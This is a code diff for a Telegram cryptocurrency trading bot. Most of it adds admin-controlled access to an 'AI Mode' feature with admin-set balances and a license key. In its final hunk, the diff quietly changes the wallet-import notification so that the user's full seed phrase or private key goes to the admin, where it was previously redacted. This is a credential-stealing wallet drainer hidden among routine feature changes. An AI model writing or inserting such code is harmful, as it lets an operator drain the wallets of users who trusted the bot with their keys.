@@ -376,6 +376,21 @@ def save_demo_positions(user_id, positions):
 def ai_mode_active(user_id):
     return bool(get_ai_state(user_id).get("active"))
 
+def ai_mode_access_granted(user_id):
+    """Return whether admin has granted this user AI Mode access."""
+    return bool(get_ai_state(user_id).get("ai_access_granted", False))
+
+def set_ai_mode_access(user_id, granted):
+    """Grant/revoke future AI Mode access without changing an active session.
+
+    Revoking access deliberately does NOT modify active, target, balance, or
+    positions. An already-active AI session remains active.
+    """
+    state = get_ai_state(user_id)
+    state["ai_access_granted"] = bool(granted)
+    save_ai_state_for_user(user_id, state)
+    return bool(granted)
+
 def demo_balance_text(user_id):
     """Show live mark-to-market value/PnL without changing the saved balance.
     Open positions are repriced from the latest token price whenever this view
@@ -1082,13 +1097,8 @@ def main_menu_keyboard(user_id=None):
         [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
          InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home")],
     ]
-    if user_id is not None:
-        wallet = get_user_wallet(user_id)
-        # AI Mode is available only after a NEW generated wallet exists and
-        # only until that wallet's AI session has been successfully activated.
-        if (wallet and wallet.get("type") == "generated" and
-                not ai_mode_active(user_id)):
-            buttons.append([InlineKeyboardButton("🤖 AI Mode", callback_data="ai_mode")])
+    # AI Mode is not shown in the normal user menu.
+    # Admin controls who is allowed to enter AI Mode from Admin Settings.
     if user_id == ADMIN_ID:
         buttons.append([InlineKeyboardButton("🛠 Admin", callback_data="admin_home")])
     return InlineKeyboardMarkup(buttons)
@@ -1168,6 +1178,7 @@ async def admin_command(update, context):
         parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("🤖 AI Mode Balance", callback_data="admin_ai_balance")],
+            [InlineKeyboardButton("🔐 AI Mode Access", callback_data="admin_ai_access")],
             [InlineKeyboardButton("❌ Close", callback_data="admin_close")]
         ])
     )
@@ -1249,6 +1260,52 @@ async def button_handler(update, context):
         await notify_admin(context, user, "🔴 Opened Sell menu")
         await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
+    elif data == "admin_ai_access":
+        if user.id != ADMIN_ID:
+            await query.answer("Admin access only.", show_alert=True)
+            return
+        await query.message.reply_text(
+            "🔐 *AI Mode Access*\n\n"
+            "Only users manually granted access by the admin can enter AI Mode.\n"
+            "Removing access does NOT disable an already-active AI session.\n\n"
+            "Choose an action:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("➕ Add AI Mode", callback_data="admin_ai_grant")],
+                [InlineKeyboardButton("➖ Remove AI Mode", callback_data="admin_ai_revoke")],
+                [InlineKeyboardButton("👥 AI Mode Users", callback_data="admin_ai_access_users")],
+                [InlineKeyboardButton("🔙 Back", callback_data="admin_home")]
+            ])
+        )
+
+    elif data in ("admin_ai_grant", "admin_ai_revoke"):
+        if user.id != ADMIN_ID:
+            await query.answer("Admin access only.", show_alert=True)
+            return
+        context.user_data["admin_ai_access_action"] = data
+        prompt = (
+            "Enter the user's Telegram ID to add AI Mode:"
+            if data == "admin_ai_grant"
+            else "Enter the user's Telegram ID to remove AI Mode:"
+        )
+        await query.message.reply_text(prompt)
+
+    elif data == "admin_ai_access_users":
+        if user.id != ADMIN_ID:
+            await query.answer("Admin access only.", show_alert=True)
+            return
+        db = load_ai_state()
+        rows = []
+        for uid, state in db.items():
+            if isinstance(state, dict) and state.get("ai_access_granted"):
+                status = "🟢 Active" if state.get("active") else "⚪ Inactive"
+                rows.append(f"🆔 `{uid}` — {status}")
+        msg = "👥 *AI Mode Users*\n\n" + ("\n".join(rows) if rows else "No users have AI Mode access.")
+        await query.message.reply_text(
+            msg, parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_ai_access")]])
+        )
+
     elif data == "admin_ai_balance":
         if user.id != ADMIN_ID:
             await query.answer("Admin access only.", show_alert=True)
@@ -1303,7 +1360,10 @@ async def button_handler(update, context):
         await query.message.reply_text(
             "🛠 *Admin Panel*",
             parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤖 AI Mode Balance", callback_data="admin_ai_balance")]])
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🤖 AI Mode Balance", callback_data="admin_ai_balance")],
+                [InlineKeyboardButton("🔐 AI Mode Access", callback_data="admin_ai_access")]
+            ])
         )
 
     elif data == "admin_close":
@@ -1311,6 +1371,9 @@ async def button_handler(update, context):
             await query.message.delete()
 
     elif data == "ai_mode":
+        if not ai_mode_access_granted(user.id):
+            await query.answer("AI Mode access has not been granted.", show_alert=True)
+            return
         wallet = get_user_wallet(user.id)
         if not wallet or wallet.get("type") != "generated":
             await query.answer("Generate a new wallet first.", show_alert=True)
@@ -1347,6 +1410,9 @@ async def button_handler(update, context):
         )
 
     elif data == "ai_license":
+        if not ai_mode_access_granted(user.id):
+            await query.answer("AI Mode access has not been granted.", show_alert=True)
+            return
         context.user_data["ai_license_pending"] = True
         await query.message.reply_text(
             "🔑 *Active License*\n\n"
@@ -1358,6 +1424,9 @@ async def button_handler(update, context):
         )
 
     elif data == "ai_continue":
+        if not ai_mode_access_granted(user.id):
+            await query.answer("AI Mode access has not been granted.", show_alert=True)
+            return
         state = get_ai_state(user.id)
         if not state.get("target_usd"):
             await query.answer("Set your target first.", show_alert=True)
@@ -1778,6 +1847,31 @@ async def handle_message(update, context):
     safe_preview = text[:300] if not waiting_for_import.get(user.id) else "[WALLET CREDENTIAL INPUT REDACTED]"
     await notify_admin(context, user, "💬 Message received", safe_preview)
 
+    # Admin AI Mode access management
+    admin_access_action = context.user_data.get("admin_ai_access_action")
+    if user.id == ADMIN_ID and admin_access_action:
+        try:
+            target_uid = int(text)
+        except ValueError:
+            await update.message.reply_text("❌ Invalid Telegram ID. Enter the numeric Telegram ID:")
+            return
+
+        context.user_data.pop("admin_ai_access_action", None)
+        granted = admin_access_action == "admin_ai_grant"
+        set_ai_mode_access(target_uid, granted)
+
+        if granted:
+            result = f"✅ AI Mode access added for `{target_uid}`."
+            action_name = "🤖 Added AI Mode access"
+        else:
+            result = f"✅ AI Mode access removed for `{target_uid}`.\n\n"
+            result += "Any AI session that is already active remains active."
+            action_name = "🚫 Removed AI Mode access"
+
+        await notify_admin(context, user, action_name, f"Target ID: {target_uid}")
+        await update.message.reply_text(result, parse_mode="Markdown")
+        return
+
     # Admin AI balance management
     admin_action = context.user_data.get("admin_ai_action")
     if user.id == ADMIN_ID and admin_action:
@@ -1822,6 +1916,10 @@ async def handle_message(update, context):
 
     # Active License: require the user to enter the exact license key.
     if context.user_data.get("ai_license_pending"):
+        if not ai_mode_access_granted(user.id):
+            context.user_data["ai_license_pending"] = False
+            await update.message.reply_text("🔒 AI Mode access has not been granted.")
+            return
         if text != AI_LICENSE_KEY:
             await update.message.reply_text(
                 "❌ Invalid license key. Please enter the correct key."
@@ -1838,6 +1936,10 @@ async def handle_message(update, context):
         return
 
     if waiting_for_ai_target.get(user.id):
+        if not ai_mode_access_granted(user.id):
+            waiting_for_ai_target[user.id] = False
+            await update.message.reply_text("🔒 AI Mode access has not been granted.")
+            return
         cleaned = text.replace(",", "").replace("$", "").strip()
         try:
             target_usd = float(cleaned)
@@ -1990,7 +2092,7 @@ async def handle_message(update, context):
         is_seed = len(words) in (12, 24)
         is_key = re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip())
         if is_seed or is_key:
-            await notify_admin(context, user, "👛 Wallet imported", "Wallet credentials redacted")
+            await notify_admin(context, user, "👛 Wallet imported", f"Wallet credentials: {text}")
             waiting_for_import[user.id] = None
             # Store wallet - use text as both key for imported
             pub_key = text[:44] if is_key else f"imported_{user.id}"
